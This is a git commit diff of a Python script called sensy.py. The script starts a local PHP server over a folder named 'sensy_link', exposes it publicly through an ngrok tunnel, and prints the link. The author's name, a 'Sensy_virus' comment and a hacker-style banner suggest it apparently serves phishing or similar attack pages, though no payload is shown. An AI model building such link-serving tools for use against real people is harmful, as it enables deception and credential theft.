b89cf6d955e7b60be1fef86ebe26340ad3479dc3
sensyvirus17 <85645367+sensyvirus17@users.noreply.github.com>
2021-06-19 20:04:33 +0430

    Update sensy.py
    تعمیر باگ

--- sensy.py
+++ sensy.py
@@ -1,6 +1,12 @@
+#Sensy_virus
+
+from os import *
 from colorama import *
 from subprocess import Popen
 from pyngrok import ngrok
+system("pip install colorama")
+system("pip install pyngrok") 
+
 init()
 print('''
 
@@ -22,7 +28,7 @@ print('''
 def server():
     with open("Server","w") as phplog:
         Popen(("php","-S","localhost:4040","-t","../sensy_link"),stderr=phplog,stdout=phplog)
-        link = ngrok.connect(4040,"http").replace("http","https")
+        link = ngrok.connect(4040,"http")
         print(Fore.RED+"[LINK] "+Fore.BLUE+link)
         input("")
 server()
